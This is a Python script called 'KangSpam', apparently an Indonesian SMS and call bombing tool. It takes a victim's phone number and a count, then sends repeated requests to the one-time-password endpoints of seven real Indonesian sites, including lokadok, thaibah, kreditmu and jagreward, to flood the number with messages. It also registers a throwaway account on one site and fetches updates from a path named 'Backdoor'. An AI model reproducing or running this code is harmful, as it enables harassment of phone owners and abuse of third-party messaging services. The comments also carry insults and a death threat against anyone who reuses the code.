# Author   : Yutixcode x Njank
# Start at : 19:13 Friday, 14 August 2020
# End date : 04:21 Saturday, 15 August 2020
# Message  : Mau ngapain lo anjing?

import os
import time
import json
import base64
import random
import requests as r
from bs4 import BeautifulSoup as b3

n_ = '\033[0m'
b_ = '\033[1m'
d_ = '\033[90m'
r_ = '\033[91m'
g_ = '\033[92m'
y_ = '\033[93m'
w_ = '\033[97m'
_w = '\033[37m'

aku = { 'Instagram':'https://instagram.com/n74nk420',
		'Facebook':'https://facebook.com/njnk.xnxx',
		'Website':'https://yutixcode.xyz',
		'Github':'https://github.com/Yutixcode',
		'Email':'yutixcode@gmail.com' }

let = 'abcdefghijklmnopqrstuvwxyz1234567890'

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	'YANG RECODE GAK IZIN BESOK MATI YA'
	print(f'''{d_}Dibuat oleh Njank Yutix{b_}\n{w_}
_  _ ____ _  _ ____ ____ ___  ____ _  _ 
|_/  |__| |{r_}\{w_} | | __ [__  |__] |__| |\/| 
| \_ |  | | {r_}\{w_}| |__] ___] |    |  | |  | {n_}{g_}v1.1{n_}

   [01] MagnetPRO {d_}[sms]{n_}
   [02] Thaibah ADSmedia {d_}[sms]{n_}
   [03] Jagreward {d_}[call]{n_}
   [04] Lokadok {d_}[sms+wa]{n_}
   [05] KreditPlus {d_}[sms]{n_}
   [06] Esaskkp {d_}[sms]{n_}
   [07] Paradox {d_}[sms]{n_}

   [69] Cek update
   [99] Report/request
   [00] Keluar\n''')

	try:
		'YANG RECODE GAK IZIN BESOK MATI YA'
		sin = int(input('KangSpam > '))
		tia = (f'{sin:0=2d}')
		if tia == '01':
			magnetpro()
		elif tia == '02':
			thaibah()
		elif tia == '03':
			jagreward()
		elif tia == '04':
			lokadok()
		elif tia == '05':
			kreditplus()
		elif tia == '06':
			esaskkp()
		elif tia == '07':
			paradox()
		elif tia == '69':
			update()
		elif tia == '99':
			sasadu()
		elif tia == '00':
			timana('slur')
		else:
			timana('bang')
	except ValueError:
		timana('bang')

def paradox():
	print('\n [+] Gunakan awalan 08 (ex: 08131xnxx)')
	dakon = r.Session()
	link1 = 'http://hideandseek.id/account/create'
	link2 = 'http://hideandseek.id/account/send_otp'
	baleg = 31
	try:
		nomer = input('  -  nomor: ')
		kabeh = int(input('  -  total: '))
		data1 ={'useremail': 'Yutixcode@gmail.com',
				'userpassword': 'Yutixcode',
				'nama': 'Yutixcode',
				'userphone': nomer }
		dakon.post(link1, data=data1)
		if baleg > kabeh:
			print()
			for i in range(int(kabeh)):
				mbung = ''.join(random.choice(let) for x in range(7))
				data2 ={'email':'Yutixcode@gmail.com',
						'phone': nomer,
						'send_otp_method': mbung }
				gas = dakon.post(link2, data=data2).json()
				if gas['response'] == 'success':
					print(f'  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}')
				else:
					print(f'  >  [{i+1:0=2d}] Status: {r_}Gagal{n_}')
				time.sleep(1)
			anggeus()
		else:
			sarakah(baleg)
	except Exception as lol:
		to(lol)

def esaskkp():
	print('\n [+] Gunakan awalan 08 (ex: 08131xnxx)')
	baleg = 16
	try:
		nomer = input('  -  nomor: ')
		kabeh = int(input('  -  total: '))
		if baleg > kabeh:
			print()
			mpsh = r.Session()
			tete = mpsh.get('http://panel.esaskkp.com/register').text
			susu = b3(tete,'html.parser').findAll('meta')[5]['content']
			host = 'http://panel.esaskkp.com/send-otp'
			data = {'_token':susu,
					'nomor_hp':nomer}
			for i in range(int(kabeh)):
				try:
					sagne = mpsh.post(host, data=data)
					if sagne.text == 'true':
						print(f'  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}')
					else:
						print(f'  >  [{i+1:0=2d}] Status: {r_}Gagal{n_}')
					time.sleep(1)
				except Exception as lol:
					to(lol)
			anggeus()
		else:
			sarakah(baleg)
	except Exception as lol:
		to(lol)

def magnetpro():
	print('\n [+] Gunakan awalan 08 (ex: 08131xnxx)')
	baleg = 21
	try:
		nomer = int(input('  -  nomor: '))
		kabeh = int(input('  -  total: '))
		if baleg > kabeh:
			shost = 'https://www.magnetpro.co.id/kirimotp.php'
			datas = { "dhp": nomer }
			print()
			for i in range(int(kabeh)):
				try:
					halah = r.post(shost, data=datas)
					masia = json.loads(halah.text)
					gabut = masia['data_sz']
					if gabut == 1:
						print(f'  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}')
					else:
						print(f'  >  [{i+1:0=2d}] Status: {r_}Gagal{n_}')
					time.sleep(0.7)
				except Exception as lol:
					to(lol)
			anggeus()
		else:
			sarakah(baleg)
	except Exception as lol:
		to(lol)
	
def timana(mimitina):
	if mimitina == 'slur': print(f'\n {b_}[!] {n_}Sampai jumpa lagi {d_}\n')
	elif mimitina == 'bang': print(f'\n {b_}[!] {r_}Input error! {d_}\n')
	print(f'  >  https://facebook.com/njnk.xnxx ')
	print(f'  >  https://instagram.com/n74nk420 ')
	print(f'  >  https://github.com/Yutixcode \n')
	exit()

def thaibah():
	'YANG RECODE GAK IZIN BESOK MATI YA'
	print('\n [+] Gunakan awalan 08 (ex: 08131xnxx)')
	baleg = 21
	try:
		nomer = input('  -  nomor: ')
		kabeh = int(input('  -  total: '))
		url = 'https://thaibah.com:443/home/resendOtp'
		num = base64.b64encode(bytes(nomer, 'utf-8'))
		if int(baleg) > kabeh:
			dat = {"nohp":num,
				"reff":"MTI4NDg5MDcxNw==",
				"type":"cmVnaXN0ZXI=",
				"provider":"c21z"}
			print()
			for i in range(int(kabeh)):
				try:
					x = json.loads(r.post(url, data=dat).text)["status"]
					if x == 'success':
						print(f'  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}')
					else:
						print(f'  >  [{i+1:0=2d}] Status: {r_}Gagal{n_}')
					time.sleep(0.7)
				except Exception as lol:
					to(lol)
			anggeus()
		else:
			sarakah(baleg)
	except Exception as lol:
		to(lol)

def sarakuh(max):
	print('\n [!] Count terlalu banyak gan')
	exit(f'  -  max: {max-975}\n')

def jagreward():
	print('\n [+] Gunakan awalan 8 (ex: 8131xnxx)')
	baleg = 6
	try:
		nomer = input('  -  nomor: ')
		kabeh = int(input('  -  total: '))
		if baleg > kabeh:
			url = 'https://id.jagreward.com/member/verify-mobile/'
			print()
			for i in range(kabeh):
				gas = json.loads(r.get(url+nomer).text)["result"]
				if gas == 1:
					print(end=f'\r  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}\n', flush=True)
					for x in range(61):
						print(end=f'\r  >  [{61-(x+1)}] Cooldown ', flush=True)
						time.sleep(1)
				else:
					print(end=f'\r  >  [{i+1:0=2d}] Status: {r_}Gagal{n_}\n', flush=True)
			anggeus()
		else:
			sarakah(baleg)
	except Exception as lol:
		to(lol)

def lokadok():
	'YANG RECODE GAK IZIN BESOK MATI YA'
	print('\n [+] Gunakan awalan 8 (ex: 8131xnxx)')
	baleg = 1000
	try:
		nomer = int(input('  -  nomor: '))
		kabeh = int(input('  -  total: '))
		if (baleg-970) > kabeh:
			seneu = 'https://www.lokadok.co.id:443/ajax_handler/generate_verification_code/'
			panas = {'type':'REG', 
					'mobile_number':nomer}
			sirah = {'Host':'www.lokadok.co.id',
					'Connection':'keep-alive',
					'Content-Length':'34',
					'Accept':'application/json, text/javascript, */*; q=0.01',
					'Origin':'https://www.lokadok.co.id',
					'X-Requested-With':'XMLHttpRequest',
					'User-Agent':'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
					'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
					'Referer':'https://www.lokadok.co.id/user/register',
					'Accept-Encoding':'gzip, deflate',
					'Accept-Language':'id-ID,en-US;q=0.8'}
			print()
			for i in range(int(kabeh)):
				try:
					r.post(seneu, data=panas, headers=sirah)
					print(f'  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}')
					time.sleep(1)
				except Exception as lol:
					to(lol)
			anggeus()
		else:
			sarakuh(baleg)
	except Exception as lol:
		to(lol)

def kreditplus():
	print('\n [+] Gunakan awalan 08 (ex: 08131xnxx)')
	baleg = 21
	try:
		nomer = input('  -  nomor: ')
		kabeh = int(input('  -  total: '))
	except Exception as lol:
		to(lol)
	if baleg > kabeh:
		hujan = 'http://kreditmu.com/registration/getOtpResponse/'
		print()
		for i in range(int(kabeh)):
			try:
				halah = r.get(hujan+nomer)
				masia = json.loads(halah.text)
				gabut = masia['Status']
				if gabut == '0':
					print(f'  >  [{i+1:0=2d}] Status: {g_}Sukses{n_}')
				else:
					print(f'  >  [{i+1:0=2d}] Status: {r_}Gagal{n_}')
				time.sleep(0.8)
			except Exception as lol:
				to(lol)
		anggeus()
	else:
		sarakah(baleg)

def sasadu():
	print('\n [+] Gunakan email aktif')
	sia     = input("  -  nama  : ")
	mailsia = input("  -  email : ")
	beja    = input("  -  pesan : ")
	if (len(sia) < 3) or (len(mailsia) < 3) or (len(beja) < 0):
		exit('\n [!] Pesan ditolak!\n     Isi yg bener tolol!\n')
	else:
		tsoh = "http://yutixcode.xyz/shell/seneu.php"
		atad = {"fromname": sia.title(),
			"fromemail": mailsia,
			"replytoname": sia.title(),
			"replytoemail": mailsia,
			"to": "yutixcode@gmail.com",
			"subject": "Hi, I'm KangSpam user",
			"message": beja}
		try:
			r.post(tsoh, data=atad)
			print("\n  >  Laporan terkirim ...\n")
		except Exception as lol:
			to(lol)

def update():
	try:
		remote = 'http://yutixcode.xyz/Backdoor/RemoteServer/KangSpam/v1.1'
		ngetes = r.get(remote).text
		if ngetes != 'Latest':
			print(f'\n {b_}[!] {g_}Versi baru sudah tersedia! {d_}\n')
			x = input('  >  Update sekarang? y/n : ').lower()
			if x == 'y':
				print(y_)
				os.system('git pull --force')
				print(f'\n {n_}{b_}[!] {g_}Update selesai \n')
				exit()
			else:
				timana('slur')
		else:
			print(f'\n {b_}[!] {r_}Versi baru belum tersedia\n')
	except Exception as lol:
		to(lol)

def to(lol):
	exit(f'\n [!] {b_}{r_}{lol}{n_}')

def anggeus():
	exit(f'\n [#] Program selesai\n')

def sarakah(max):
	print('\n [!] Count terlalu banyak gan')
	exit(f'  -  max: {max-1}\n')

if __name__ == '__main__':
	main()